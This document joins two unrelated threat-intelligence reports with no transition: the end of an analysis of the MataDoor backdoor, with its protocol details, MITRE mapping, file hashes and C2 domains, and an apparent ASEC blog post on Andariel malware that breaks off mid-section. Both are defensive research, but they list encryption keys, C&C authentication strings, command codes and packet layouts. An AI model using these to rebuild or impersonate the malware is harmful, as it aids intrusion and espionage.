Data can be pre-compressed with LZ4 prior to transmission as long as both parties support the algorithm. Available compression modes are defined in the transport configuration (COMPRESSION_TYPE, serialization key = 0×30051), with values from 1 through 3. If the compression mode N is set, the party will support every mode from 1 through N. Parties that exchange data during a session agree on a compression mode with the smallest value available for each of the parties.
In the sample under review, the COMPRESSION_TYPE set to 1 means that data will be transmitted uncompressed. The parameter values 2 or 3 correspond to LZ4. The modes 2 and 3 do not differ in any way.
A buffer transmitted during a session will not be compressed in the following cases:
1.	The size of a random 256-byte section of the compressed buffer constitutes more than 80% of the uncompressed size.
2.	The buffer size is less than 256 bytes.
3.	The buffer could not be compressed.
Both parties to the session record statistics on data they exchange, and the figures thus calculated are serialized in the parties' connection configurations. The following are calculated:
1.	Compressed data send rate (COMPRESSED_DATA_SEND_RATE, serialization key = 0x30055)
2.	Uncompressed data send rate (RAW_DATA_SEND_RATE, serialization key = 0x3004B)
3.	Compressed data receive rate (COMPRESSED_DATA_RECV_RATE, serialization key = 0x30056)
4.	Uncompressed data receive rate (RAW_DATA_RECV_RATE, serialization key = 0x3004C)
No functionality we found in the samples under review made use of the above statistics.
CONTROL
The control transport is an auxiliary transport whose function is to receive information about the status of the auth server. The current implementation of the backdoor only supports receiving the number of standby agent connections, separately for those with and without authentication.
A client that uses this transport might be a way for the backdoor operator to trace new agent connections from backdoors and initiating client connections to these.
Each of the samples we studied implements a version of the control transport client, but it does so incompletely, as it only connects to the auth server, without sending any commands to it or receiving any information.
The connection initiation protocol resembles the similar auth and client transport protocols, except that the client is always authenticated when a control connection is initiated. The command codes and argument contents are different as well.
A connection is established as follows:
1.	The client connects to the server on the lower transport levels.
2.	The client sends the server a COMMAND_CONNECT_CONTROL command (code = 0×5) with an argument that contains the serialized flag NEED_TO_ENSURE_CLIENT_AUTHENTICITY (0×30047). The meaning of that parameter in the context of this protocol defines which type of connections we want to receive information about: authenticated (flag set to 1) or unauthenticated (flag set to 0).
3.	As in the case with the message to sign from the agent transport, upon receiving the command, the server generates a random 32-byte message and sends it to the client in serialized form (key = 0×5004F) as an argument for the COMMAND_RECONNECT command (code = 0×8).
4.	The client signs the message with an EdDSA signature using a private key stored in the transport configuration and sends the server another COMMAND_CONNECT_CONTROL command (0×5), with the following serialized data as arguments:
o	Message to sign (serialization key = 0x5004F)
o	Its digital signature (serialization key = 0x50050)
o	Public key for validating the signature (serialization key = 0x5004E)
o	Newly sent parameter NEED_TO_ENSURE_CLIENT_AUTHENTICITY (serialization key = 0x30047)
5.	The server validates the response it receives according to the criteria listed in the descriptions of the client and agent transports. The public key sent for validation may match either the client and agent connection validation public key, or the second possible key:
    

char pubKey2 = [0xB8, 0x29, 0x7D, 0xF4, 0x02, 0x42, 0x32, 0xEF, 0x60, 0xA3, 0x80, 0x23, 0x91, 0x4F, 0x5D, 0x12, 0x61, 0x9D, 0xAE, 0xE8, 0x57, 0x10, 0x17, 0xE9, 0xB5, 0xB2, 0x9A, 0x3F, 0xE0, 0xA6, 0x45, 0x0D];
	    

	
If validation fails, the server closes the connection. If validation is successful, the server sends the client a COMMAND_CONNECTION_ESTABLISHED command (code = 0×6), the connection is considered to be established, and the server proceeds to process commands from the client.
Here's a diagram of this process:
 
As mentioned above, the client may send only one command to the server: CONTROL_GET_FREE_AGENTS_COUNT (code = 0×4): get the number of free agent connections, with or without the authentication requirement, depending on the value of the NEED_TO_ENSURE_CLIENT_AUTHENTICITY parameter specified when the connection was initiated. This command may have an argument—the serialized value in seconds (key = 0×3004A) of the timeout for waiting for new connections if there are no free ones. The server sends the result of the command execution as an argument for a COMMAND_CONNECTION_ESTABLISHED command (0×06). In the absence of free connections, the server sends the client a COMMAND_CONTROL_NO_DATA command (0×07) without arguments. After a response is sent, the command receiving and processing cycle repeats.
Conclusion
Our analysis suggests that the Dark River group launches one-off attacks on thoroughly selected targets, as evidenced by targeted email campaigns that consider the nature of the target companies' operations. The attacks are hard to attribute, as for each target, the group deploys a separate network infrastructure unrelated to any other malicious campaigns.
The group's main tool, the MataDoor backdoor, has a modular architecture, with a complex, thoroughly designed system of network transports and flexible options for communication between the backdoor operator and an infected machine. The code analysis suggests that the developers invested considerable resources into the tool.
Our study shows that Russian defense industry enterprises remain an object of targeted attacks that utilize increasingly complex and sophisticated tools. The Dark River group typifies these activities aimed at espionage and theft of confidential information.
Authors: Denis Kuvshinov and Maxim Andreev, with the participation of the incident response and threat intelligence teams.
Applications
Verdicts by Positive Technologies products
YARA rules
exploit_win_ZZ_CVE202140444__Exploit__MSHTML__RCE__Artifact
tool_win_ZZ_OfficeTemplate__Downloader__Encoding__Artifact
apt_win_CN_APT41__Trojan__ExportEngineLoaderString
Behavioral rules
Trojan.Win32.Evasion.a
Trojan.Win32.Generic.a
Trojan.MachineLearning.Generic.a
Create.Process.NetworkScanner.NetworkScanning
Create.Process.Reg.RegistryModify
Create.Process.Regsvr32.RestrictionsBypass
Create.Process.Rundll32.RestrictionsBypass
Create.Process.Whoami.Reconnaissance
Create.Query.WMI.CheckVM
Delete.Process.TerminateProcess.Evasion
Read.NetShare.RPC.Enumeration
Read.Process.Handle.Enumeration
Read.Registry.Key.NetAdapterId
Read.Registry.Key.NetInterfaces
Read.System.Info.Reconnaissance
Read.System.RemoteResources.Enumeration
Read.File.Name.Enumeration
Network rules
BACKDOOR [PTsecurity] Matadoor Magic 10009938
BACKDOOR [PTsecurity] Matadoor Magic 10009939
BACKDOOR [PTsecurity] Matadoor Magic 10009940
BACKDOOR [PTsecurity] Matadoor CnC 10009941
BACKDOOR [PTsecurity] Matadoor 10009946
BACKDOOR [PTsecurity] Possible Matadoor HTTP in UDP Request 10009947
BACKDOOR [PTsecurity] Possible Matadoor HTTP in UDP Response 10009948
PT Sandbox
BACKDOOR [PTsecurity] Possible Matadoor 10009942
BACKDOOR [PTsecurity] Possible Matadoor HTTP in UDP 10009950
BACKDOOR [PTsecurity] Possible Matadoor 10009951
BACKDOOR [PTsecurity] Possible Matadoor Response 10009952
BACKDOOR [PTsecurity] Possible Matadoor Multiple HTTP Request 10009955
BACKDOOR [PTsecurity] Possible Matadoor Multiple HTTP Response 10009956
BACKDOOR [PTsecurity] Possible Matadoor HTTP in UDP 10009959
BACKDOOR [PTsecurity] Possible Matadoor Multiple HTTP in UDP Request 10009960
MITRE
ID	Name	Description
Initial access		
T1566.001	Phishing: Spearphishing Attachment	The Dark River group uses phishing email campaigns with malicious attachments
Execution		
T1059.003	Command and Scripting Interpreter: Windows Command Shell	The Dark River malware features remote command shell functionality
T1106	Native API	The Dark River malware uses WinAPI functions to run new processes
T1129	Shared Modules	The Dark River malware can download additional modules to execute malicious functions
Persistence		
T1543.003	Create or Modify System Process: Windows Service	The Dark River group creates malicious services to gain persistence on a target host
Defense Evasion		
T1622	Debugger Evasion	Some samples of the Dark River malware are packed with the Themida protection tool, which detects debuggers
T1140	Deobfuscate/Decode Files or Information	MataDoor executables are obfuscated with a protector to hamper detection and analysis
T1036.004	Masquerading: Masquerade Task or Service	MataDoor executable file names imitate the names of legitimate executables deployed on a target host
T1112	Modify Registry	MataDoor stores its configuration in encrypted form inside the registry
T1027.002	Obfuscated Files or Information: Software Packing	Every MataDoor sample contains separate functions shielded by a protector via virtualization
T1620	Reflective Code Loading	MataDoor reflectively loads PE modules with plugins into the address space of its process
T1218.010	System Binary Proxy Execution: Regsvr32	MataDoor can be started with the help of the Regsvr32 system utility
T1218.011	System Binary Proxy Execution: Rundll32	MataDoor can be started with the help of the Rundll32 system utility
Discovery		
T1083	File and Directory Discovery	MataDoor can collect information about files and directories on a compromised host
T1135	Network Share Discovery	MataDoor can collect information about shared network resources in a compromised network
T1046	Network Service Discovery	MataDoor can collect information about hosts with predefined open ports
T1057	Process Discovery	MataDoor can collect information about processes running on an infected host
T1018	Remote System Discovery	MataDoor can collect information about the availability of hosts in a compromised network
T1082	System Information Discovery	MataDoor can collect information about the OS version and the computer name of a local machine
T1016	System Network Configuration Discovery	MataDoor can collect information about the IP and MAC addresses of the local network interface of a compromised host
T1049	System Network Connections Discovery	MataDoor can collect information about active TCP connections on a compromised host
T1033	System Owner/User Discovery	MataDoor obtains and sends to the C2 the name of the current user of the compromised host
T1124	System Time Discovery	MataDoor can collect information about the system time on an infected host
Collection		
T1560.002	Archive Collected Data: Archive via Library	MataDoor can compress collected data with a statically linked zlib library
T1074.001	Data Staged: Local Data Staging	MataDoor can save intermediate data collection results locally to send to the C2 later
T1005	Data from Local System	MataDoor can harvest data from an infected host
Command and control		
T1071	Application Layer Protocol	MataDoor malware can use application-layer protocols, such as SMB, and an HTTP-like custom protocol to communicate with the C2
T1132	Data Encoding: Standard Encoding	MataDoor can compress the data it sends over networks with LZ4
T1572.001	Encrypted Channel: Symmetric cryptography	MataDoor encrypts traffic with RC4
T1572.002	Encrypted Channel: Asymmetric cryptography	MataDoor contains a statically linked WolfSSL library for encrypting traffic
T1008	Fallback Channels	MataDoor can use alternative configurations to connect to the C2
T1095	Non-Application Layer Protocol	MataDoor can connect on top of the TCP protocol and via a custom protocol based on UDP datagrams
T1571	Non-Standard Port	MataDoor can connect to the C2 on ports that are not typical of the protocol being used
T1572	Protocol Tunneling	MataDoor builds a hierarchical system of protocols, where a lower layer encapsulates a higher one, thus tunneling the traffic
T1090.001	Proxy: Internal Proxy	MataDoor can set up a channel to the C2 through a proxy located on a compromised network
T1090.002	Proxy: External Proxy	MataDoor can set up a channel to the C2 through a proxy located on an external network
T1090.003	Proxy: Multi-hop Proxy	MataDoor can set up a channel to the C2 through a chain of relay nodes
Exfiltration		
T1030	Data Transfer Size Limits	MataDoor can divide data it sends into chunks of variable size
T1041	Exfiltration Over C2 Channel	MataDoor can send data over an existing C2 communication channel


IOCs
File indicators
Loader service
sha256	sha1	md5
2019322c33b648c9d3f7c8a17a990860044c03ed7bd2fc9e82139c22e9bc5635	3d4c3856f86c1dac1fe644babe87f1e5b6c6636f	1f19f7db272cc5ec22eb08987aaffcab
207f386ebeb29e64e6b7fd10929217e1a664f06e6cc503e8798f57e0af2e5267	3f8016bafb700595490b732b92f8501201f0c9af	01f3a22bf3e409154e79e067370ed98a
2ba653faef17d9ea623be1138f6f420be27c95d8ad7ee1ea0d15ae718895176d	bf8f0b845c8f13b4386b7204add3c5d2e504b4c6	4d1e16e2b914243e0c63017676956a73
748b9e94dc62e1fa364e9daec7d4bbb94a69b304cb81e1a1b6d302be47381a94	9cc89d708fcc2b114f6589d8077f66395d4b68ba	fd7de2b8572f35f0f6f58bba6ff2360e
9b632505c27fa8ee58f680599fcc0b1794439af17a8c95df9f413e227e34798c	8a3d32cb67bbf600c81577f4c2dd0a5e601c43d4	538505d57722f6f6e747f7f1517f9c7d
b822db93cde13ee2b2faf41e5a6096782bda7a71ef028641d2ce6ad9db777b67	d3d38d113fcaf3ea2e1b8bc5c32182141f918246	b52439640b7f0e0273f0d15bb3af6198
c8399484d20c0ebed376cc8147e003cf4d930b5130392ae0e14cee0cec42d484	6da222a04b4d0ad74f7ab186d235b55a9bcf7a18	cc26e5fda0083f750d7748eeaea45350
ec70414b2295392cf7200b99747922a5648c4d2882140bd04c7661030aabe928	ae0bf4a92b37da3ca4dbd965bc646a747b7ceaf4	317f1027095bc41de8fbcfce2c764ac4


MataDoor
sha256	sha1	md5
0085a02b9ba24afd266116df43acbd4f57fc8822af4929e7d17b59f2ceae9418	9320a614916bbfaa31853d785ffe0ed0fc7b54f4	79fc7ed090bc935881e7c242e40071a2
3c1cfc2b8b7e5c2d713ec5f329aa58a6b56a08240199761ba6da91e719d30705	87e3e59f6653ae1306461bf9683bda92f442d77f	fe93382464347be4361c7e8fb131a668
566835ce413271ddca8d5014c912dda8ba7e5e45573a7da6ba8e20d72541a2ca	73d6694a0339cc4083f66395b6b4b3da324e2113	6f736eac915c2b647bfbba9e5dccf0cb
660bfbeeaf674e4e95c43bb61d7d0aec88154527e1218e51c1cb75d77c8acdda	6251126c3a44d5f8a72f0790ae8aba1b195cb5b2	610303b58eb5d039c15061e48b743d17
ec1205a050693f750dd6a984b68eb2533539a34a5602744127d1b729b22f42fd	73055a139a248cccb2b6f4360f072f7626b4ce7c	20ee5ab5724339f16c19be92d0912bb6
fdf50a01a8837c9f4280f3e7f7e336f3cbf93a30c78b48aa50c05b45a7f2ee5b	4a65848af705b2d2b23af0b0795f0ec8bfdc0c69	34e3e94f9955c101640b44926bc44393


Phishing documents
sha256	sha1	md5
0b06fb7f53bb7963ec2ff89d832b831763706e44d206a4d0a8c813ebee633e22	f463b1cf8d6dd8004edf047b4dea3c4e283f0ffb	fcbe52f671d2f20b292c3057320d89a9
2e068beb40f8901b698d4fc2f5766564c8324d5ba95fb0a0ffa841f5da5c7e72	178b11323f921c0216bedefdd575a9c5a055b9fa	98e94d7be1d59c17f6bcf3ce09661f83
4f544e8756373520e98ed12b921ea7e05a93cf0152405ef3ac65133f7c8660a1	e0f4924aeb8befbf6a78411f910d2c148de7c5ff	c587cdbadc3573149c8b1a78fbbd876f
84674acffba5101c8ac518019a9afe2a78a675ef3525a44dceddeed8a0092c69	4b35d14a2eab2b3a7e0b40b71955cdd36e06b4b9	41dacae2a33ee717abcc8011b705f2cb
a1797d212560de7fd187d0771e8948bd8e0e242bed0ca07665f78076f4e23235	09413b5d9d404398bc163bfe239e5f8d149ff412	a1fc74b7fb105252aba222f5099fbd04
b0a4a1998a1be57d5b9b9ce727d473f46dfc849a3369ee8323d834bebf5ca70a	647497d00704316a7414d357834ed3f7f111a85f	bb93392daece237207b6e32fb5fb4f00
d00073956786fb8a6b7168b243fa2ea8bb3dff345c020913638ce45c44b78dde	6924b5219448733c43be7f569b1040d468b939f1	0818cda2299b358e1ddf4ea59249a6c4


Network indicators
fetchbring.com
cameoonion.com
kixthstage.com
fledscuba.com
capetipper.com
cravefool.com
trendparlye.com
merudlement.com
ipodlasso.com
aliveyelp.com
beez.com
bestandgood.com
bettertimator.com
biowitsg.com
cakeduer.com
casgone.com
diemonge.com
e5afaya.com
editngo.com
eimvivb.com
endlessutie.com
flowuboy.com
futureinv-gp.com
ganjabuscoa.com
getmyecoin.com
iemcvv.com
interactive-guides.com
investsportss.com
ismysoulmate.com
justlikeahummer.com
metaversalk.com
mlaycld.com
moveandtry.com
myballmecg.com
nuttyhumid.com
otopitele.com
outsidenursery.com
primventure.com
pursestout.com
reasonsalt.com
searching4soulmate.com
speclaurp.com
sureyuare.com
tarzoose.com
wemobiledauk.com
wharfgold.com
xdinzky.com
zeltactib.com

 
Posted By Sanseo , August 31, 2023
Analysis of Andariel’s New Attack Activities
Contents
1. Past attack cases
…. 1.1. Cases of Innorix Agent abuse
…….. 1.1.1. NukeSped variant – Volgmer
…….. 1.1.2. Andardoor
…….. 1.1.3. 1th Troy Reverse Shell
…. 1.2. Cases of attacks against Korean corporations
…….. 1.2.1. TigerRat
…….. 1.2.2. Black RAT
…….. 1.2.3. NukeSped variants
2. Cases of recent attacks
…. 2.1. Cases of Innorix Agent abuse
…….. 2.1.1. Goat RAT
…. 2.2. Cases of attacks against Korean corporations
…….. 2.2.1. AndarLoader
…….. 2.2.2. DurianBeacon
3. Connections to recent attack cases
4. Connections to past attack cases of the Andariel group
5. Conclusion
The Andariel threat group which usually targets Korean corporations and organizations is known to be affiliated with the Lazarus threat group or one of its subsidiaries. Attacks against Korean targets have been identified since 2008. Major target industries are those related to national security such as national defense, political organizations, shipbuilding, energy, and communications. Various other companies and institutes in Korea including universities, logistics, and ICT companies are also becoming attack targets. [1] (this report only supports the Korean version)
During the initial compromise stage, the Andariel threat group usually employs spear phishing, watering hole, and supply chain attacks. Additionally, there are cases where the group abuses central management solutions during the malware installation process. [2] A notable fact about the group is its creation and use of various malware types in its attacks. There are many backdoor types, including Andarat, Andaratm, Phandoor, and Rifdoor used in the past attacks, as well as TigerRAT [3] and MagicRAT [4] which have been detected for the past few years.
AhnLab Security Emergency response Center (ASEC) is continuously monitoring the attacks of the Andariel threat group. This blog post will cover details surrounding the recently identified attacks deemed to be perpetrated by the Andariel group. Note that because the malware strains and C&C servers identified in past attack cases were not used in the aforementioned attacks, there is no direct connection. Thus, in order to identify the connection between the recent attacks and the Andariel threat group, this post will first analyze the cases of attacks by the Andariel group in the first half of 2023. Then the analysis will be used to identify the possible link between the attacks and the threat group. Details confirmed in the past attack cases will be included if necessary.
One characteristic of the attacks identified in 2023 is that there are numerous malware strains developed in the Go language. In an attack case where Innorix Agent was used, a Reverse Shell developed in Go was used. Black RAT was used in attacks targeting Korean companies afterward. Such trends continued into the recent cases, where other malware strains developed in Go such as Goat RAT and DurianBeacon are being used in attacks. Besides the Go version, DurianBeacon has a version developed in the Rust language as well.
 Figure 1. Source code information of DurianBeacon developed in Go
Because the initial distribution case could not be identified directly, this post will conduct an analysis based on the malware strains used in the attacks. Note that various malware types are being used in the attacks. When a name given by the malware creator can be confirmed, the said name will be used. If not, the names of similar malware types or AhnLab’s detection name will be used.
1. Past attack cases
1.1. Cases of Innorix Agent abuse
In February 2023, ASEC shared the case where the Andariel threat group distributed malware to users with a vulnerable version of Innorix Agent in the blog post “Distribution of Malware Exploiting Vulnerable Innorix: Andariel.” [5] The Innorix Agent program abused in distribution is a file transfer solution client program. According to the post regarding the vulnerability by the Korea Internet & Security Agency (KISA), the affected versions were found to be INNORIX Agent 9.2.18.450 or earlier, which were advised to be applied with the security update. [6] (this content only supports the Korean version)
 Figure 2. Malware being distributed using Innorix Agent which had been vulnerable in the past
An investigation of the malware strains used in the attacks based on past attack cases revealed that multiple Korean universities were infected with malware strains. Most malware types used in the attacks were backdoors, and no previously identified type was present. However, because there is a connection with other malware strains used in the past or those used in subsequent attacks, a brief summary of their characteristics will be given.
1.1.1. NukeSped variant – Volgmer
As covered in the ASEC Blog before, this malware strain uses the following 0x10 byte key in the process of communicating with the C&C server to encrypt packets. The key value in question is the same as the one employed in Volgmer used by the Hidden Cobra (Lazarus) threat group, as stated in a report by the United States Cybersecurity & Infrastructure Security Agency (CISA). [7] (page currently unavailable)
•	Key: 74 61 51 04 77 32 54 45 89 95 12 52 12 02 32 73
Volgmer was also used in comparatively recent attacks. It runs by reading the configuration data saved in the registry key “HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security” and uses the HTTP protocol to communicate with the C&C server. Such characteristics are highly similar to the type mentioned in the CISA report in the past, which means that the malware continues to be used in attacks with no significant variants being released. While the same key value was used in both the malware mentioned in this post and Volgmer, there is a difference: the malware used in the current attack cases uses the key value to encrypt the packets used to communicate with the C&C server. Meanwhile, Volgmer uses the value to decrypt the encrypted configuration data saved in the registry.
Accordingly, it is not entirely accurate to categorize the above malware strain as a type of Volgmer, so it was categorized as a variant of NukeSped instead. The malware is a comparatively simple backdoor that only provides basic features. Notably, the Batch script used in the self-deletion process is similar to the one used in NukeSped types in the past.
 Figure 3. Batch script used in the self-deletion process
1.1.2. Andardoor
Developed in .NET, this malware is a backdoor that uses the name TestProgram. Based on AhnLab’s detection name, it is classified as Andardoor. It is notable for being obfuscated using the Dotfuscator tool. It offers various features for controlling the infected system, such as file and process tasks, executing commands, and capturing screenshots. SSL encryption is used for communication with the C&C server. For the server name, it designated the “clientName” string.
 Figure 4. SSL communications routine with the C&C server
1.1.3. 1th Troy Reverse Shell
1th Troy is a Reverse Shell malware developed in Go. The following string included in the binary shows that the malware has the simple name of “Reverse_Base64_Pipe” and the malware’s creator classified the malware as “1th Troy”.
G:/Code/01__1th Troy/Go/Reverse_Base64_Pipe/Client/client.go
Being a Reverse Shell that only provides basic commands, the commands supported include “cmd”, “exit”, and “self delete”. They support the command execution, process termination, and self-deletion features respectively.
 Figure 5. Reverse Shell with a simple structure
1.2. Cases of attacks against Korean corporations
The Andariel group also distributed malware in March 2023 in its attacks against the Korean defense industry and an electronics device manufacturer. The method of initial compromise has not yet been identified, but logs of the mshta.exe process installing TigerRat and the mshta.exe process being terminated were confirmed through the AhnLab Smart Defense (ASD) infrastructure. This means that the malware strains were installed through a script-type malware with the spear phishing attack method.
 Figure 6. Mshta process installing TigerRat
Malware strains used in attacks were generally backdoor types. TigerRat, which has been used by the Andariel group since the past, was also included.
1.2.1. TigerRat
Tiger Rat is a RAT-type malware with its name given by KISA [8] and has been consistently employed by the Andariel threat group since 2020. It is known to be generally distributed through malicious document files containing macros that are attached to spear phishing emails, or through watering hole attacks. [9] There are also cases where the Andariel group targeted Korean corporations that use vulnerable versions of VMware Horizon and launched Log4Shell vulnerability attacks to install TigerRat. [10]
Besides offering basic features such as file tasks and executing commands, TigerRat is a backdoor that supports other various features such as collecting information, keylogging, capturing screenshots, and port forwarding. One of its characteristics is that there is an authentication process upon the first communication session with the C&C server. In past versions, the string shown below disguised as SSL communications was used in the authentication process. Depending on the malware version, either the string “HTTP 1.1 /member.php SSL3.4” or “HTTP 1.1 /index.php?member=sbi2009 SSL3.3.7” must be sent to the C&C server, and the string “HTTP 1.1 200 OK SSL2.1” should be sent in return for authentication to be successful.
 Figure 7. String used in the authentication process for the C&C server – past version
However, in the recently identified TigerRat type, the following random strings 0x20 in size are used. These strings are thought to be the MD5 hash for “fool” (dd7b696b96434d2bf07b34f9c125d51d) and “iwan” (01ccce480c60fcdb67b54f4509ffdb56). It seems that the threat actor used random strings in the authentication process to evade network detection.
 Figure 8. String used in authentication to the C&C server – latest version
•	C&C request string: dd7b696b96434d2bf07b34f9c125d51d
•	C&C response string: 01ccce480c60fcdb67b54f4509ffdb56

1.2.2. Black RAT
Black Rat is a backdoor-type malware that is likely created by the threat actor. Like other malware strains, it was developed in Go. While the 1th Troy Reverse Shell identified in the previous case only supports a basic command execution feature, Black Rat provides many additional features such as downloading files and capturing screenshots.
 Figure 9. Features supported by Black RAT
Examining the following string included in the binary shows that the malware creator classified the malware as a RAT type and named it Black.
I:/01___Tools/02__RAT/Black/Client_Go/Client.go

1.2.3. NukeSped variants
A typical NukeSped-type backdoor was also used in this attack. Supported features include network scanning, process and file lookup, file upload/download, and command execution. The names of the APIs to be used are encrypted as shown below. These are decrypted and the API names are taken from somewhere else. A key with a size of 0x26 is used for decryption.
 Figure 10. Obfuscated API string
•	Key value used for decryption: i<6fu>-0|HSLRCqd.xHqMB]4H#axZ%5!5!?SQ&
This NukeSped variant also uses a Batch script for self-deletion, but it is slightly different from the one used in the previous attacks.
 Figure 11. Batch script used in the self-deletion process
There are two types of identified NukeSped variants: Reverse Shell and Bind Shell types. Both listen to port number 10443. This NukeSped variant has an authentication process before communicating with the C&C server like TigerRat. Yet whereas TigerRat disguised the process as SSL communications, NukeSped disguised it as HTTP communications. Thus, after sending the following POST request, an accurately matching HTTP response must be received for the malware to commence communications with the C&C server.
 Figure 12. HTTP packet used in authentication
2. Cases of Recent Attacks
ASEC is monitoring attacks of the Andariel group and has recently identified cases of Innorix Agent being abused to install malware. Unlike past cases where Innorix Agent was downloading malware strains, the recent case directly creates the malware file, so it is not certain whether the attacks are vulnerability attacks or if Innorix Agent was simply abused.
Malware strains identified in these attacks are not those that had been used by the Andariel group in the past, but aside from the fact that Innorix was used in the attacks, the current attack is similar to past attack cases in that the attack targets are Korean universities. While the attack was being perpetrated, attack cases against Korean ICT companies, electronic device manufacturers, the shipbuilding industry, and the manufacturing industry were identified as well. Analysis showed that there was a connection with the malware strains used in attack cases where Innorix was abused.
This part will analyze each attack case and malware strains used in the attacks. Afterward, a summary will be given of the conclusion that the same threat actor is behind these attacks and the basis behind the claim, as well as the relationship between the current attacks and past attack cases of the Andariel threat group.

2.1. Cases of Innorix Agent abuse
2.1.1. Goat RAT
In recent attacks against Korean universities, there were cases where Innorix Agent installed malware strains. Innorix Agent installed the malware strains under the name “iexplorer.exe”. This is one of the names that has been often used by the Andariel group.
 Figure 13. Using Innorix Agent to install Goat RAT
E:/Projects/Malware/6_Goat_23/Goat/Goat.go
E:/Projects/Malware/6_Goat_23/Goat/define.go
E:/Projects/Malware/6_Goat_23/Goat/anti-vaccine.go
E:/Projects/Malware/6_Goat_23/Goat/command.go
Although the recent version is obfuscated unlike the Go-based backdoor-type malware used in past attacks, basic file tasks, self-deletion features, etc. can be identified. There are also logs where the following commands were executed.
> cmd /c tasklist
> cmd /c ipconfig /all
 Figure 14. Obfuscated function name
2.2. Cases of attacks against Korean corporations
2.2.1. AndarLoader
Aside from the attack cases where Innorix Agent was abused, ASEC identified another type of attack in a similar period of time. While the initial distribution route has not yet been ascertained, the malware strains used in the attacks were obfuscated with a tool called Dotfuscator like the .NET malware strains classified as Andardoor. Another common trait is that both types use SSL communications with the C&C server. Unlike Andardoor which used “clientName” when connecting to the C&C server, this attack case used the string “sslClient”.
 Figure 15. SSL connection process with the C&C server
Whereas Andardoor had most of its features already implemented, this malware strain only has a downloader feature to download and execute executable data such as .NET assemblies from external sources. Out of the commands sent from the C&C server, the commands shown below can be used to execute or terminate the received code. Behaviors performed by the threat actor using AndarLoader include installing Mimikatz in the infected system, which has been confirmed through a recorded log.
At the time of analysis, the C&C server was unavailable for access and the part in charge of the actual features could not be investigated, so no direct similarity with Andardoor could be confirmed. However, the use of the same obfuscation tool or the similarities in the communication process with the C&C server led AhnLab to categorize this malware as the AndarLoader type.
Command	Feature
alibaba	Execute the downloaded .NET assemblies
facebook	Execute the downloaded .NET method
exit	Terminate
vanish	Self-delete and terminate
Table 1. List of commands that can be executed
Among the commands given by the treat actor that AndarLoader executes, there is a command to terminate the mshta.exe process. The fact that AndarLoader was installed via PowerShell and the mshta.exe process was involved leaves the possibility that this is a spear phishing attack like the cases of attacks covered above.
 Figure 16. Commands executed by AndarLoader
Additionally, logs of the mshta.exe process connecting to the C&C server can be found in systems infected with AndarLoader.
 Figure 17. Network communications log
The domain kro.kr was used as the C&C and download URLs. This is a domain generally used by the Kimsuky threat group. Also, the fact that Ngrok was installed for RDP connection during the attack process shows how the case is similar to the attack pattern of the Kimsuky group.
 Figure 18. Log showing the installed Ngrok being executed
2.2.2. DurianBeacon
While investigating the AndarLoader malware, AhnLab identified that a malware strain named DurianBeacon was also used in the attack process. There are two versions of DurianBeacon, one developed in Go and the other developed in Rust. Both are backdoors that can perform malicious behaviors by receiving the threat actor’s commands from the C&C server.
A. Go Version
Examining the following strings included in the binary indicates that the malware creator named this malware strain DurianBeacon.
G:/Dev/Go/DurianBeacon/Command.go
G:/Dev/Go/DurianBeacon/SSL.go
G:/Dev/Go/DurianBeacon/Utils.go
G:/Dev/Go/DurianBeacon/main.go
The Go version of DurianBeacon uses the SSL protocol to communicate with the C&C server. After initial access, it sends the infected system’s IP information, user name, desktop name, architecture, and file names before awaiting commands. When a command is sent, it returns a result. Supported features besides collecting basic information about the infected system include file download/upload, lookup, and command execution features.
 Figure 19. Features supported by DurianBeacon
Because the SSL protocol is used, communications packets are encrypted. The following packet structure is used internally.
Offset	Size	Description
0x00	0x04	Command number
0x04	0x04	Size of the command argument
0x08	Variable	Command argument
Table 2. Command packet structure of DurianBeacon
The features corresponding to each command code are as follows.
Command	Feature
0x00	Hibernate
0x01	Interval
0x02	Execute commands (return results)
0x03	Look up directories
0x04	Drive information
0x05, 0x06, 0x07, 0x08	Upload files
0x09, 0x0A, 0x0B	Download files
0x0C	Create directories
0x0D	Delete files
0x0E	Run commands
0x0F	Terminate
Table 3. List of DurianBeacon commands
After executing commands, the malware sends the success status or the command execution results to the threat actor’s C&C server. The response is also similar to the command packet.
Offset	Size	Description
0x00	0x04	Response number
0x04	0x04	Size of the command execution results
0x08	Variable	Command execution results
Table 4. Structure of the DurianBeacon response packet
Response	Description
0x00	Return command results
0x01, 0x02, 0x03	Look up directories (start, terminate, etc.)
0x04	Drive information
0x05, 0x06, 0x07	Upload files (error, success, etc.)
0x08, 0x09, 0x0A	Download files (error, success, etc.)
0x0B, 0x0C	Create directories (failure or success)
0x0D, 0x0E	Delete files (failure or success)
0x0F, 0x10	Run commands (failure or success)
Table 5. DurianBeacon’s response list
B. Rust Version
Investigation of related files revealed that the Rust version of DurianBeacon was also used in attacks.
•	PDB information: C:\Users\Anna\Documents\DurianBeacon\target\x86_64-pc-windows-msvc\release\deps\DurianBeacon.pdb
DurianBeacon supports packet encryption using XOR aside from SSL to communicate with the C&C server, using the key 0x57.
 Figure 20. Rust version of DurianBeacon supporting XOR encryption
The packet structure and commands are also the same as the Go version. The Rust version of DurianBeacon sends the keyword “durian2023” alongside the infected system’s IP information, user name, desktop name, architecture, and file names before awaiting command. When a command is sent, it returns the results.
 Figure 21. Communications packet of the Rust version – test
3. Connections to recent attack cases
The above section covered the recently identified two cases where universities in Korea were attacked through abusing Innorix Agent and where malware strains were installed in Korean corporations through presumably spear phishing attacks. This part will explain why AhnLab considers the same threat actor to be behind both types of attacks.
First, there are cases in AhnLab’s ASD logs where Durian, Goat RAT, and AndarLoader were collected together in a similar period. The system in question is thought to be the threat actor’s test PC because the path name of AndarLoader was as follows.
•	AndarLoader collection path: d:\01__developing\99__c#_obfuscated\runtime broker.exe
There are also cases where the C&C servers of backdoor-type malware strains were the same. When the threat actor used Innorix Agent to install malware, Goat RAT was mainly employed, but there is a significant portion where other malware strains were installed. While such malware samples could not be collected, there are recorded communications logs with the C&C server. Also, the URL in question was the same as the DurianBeacon C&C server URL used in other attacks.
 Figure 22. C&C communications log of the malware installed through Innorix Agent
Finally, there was a log where DurianBeacon installed AndarLoader. This means that these attacks happened around a similar time period, and the attacks might be related to each other as the installation processes and the C&C server URLs used tend to be similar.
 Figure 23. Log showing DurianBeacon creating AndarLoader
4. Connections to past attack cases of the Andariel group
The recently identified two attack cases are likely done by the same threat actor. This section will cover the relationship between these attacks and the Andariel threat group.
A. Attack Targets
•	Attacked universities, the national defense industry, electronic device manufacturers, ICT companies, etc. in Korea.
B. Attack Methods
•	Abused Innorix Agent like in past cases
•	Probably employed spear phishing method like in past cases
•	Similarities between the path and file names used when installing the malware strains
C. Malware Types Used
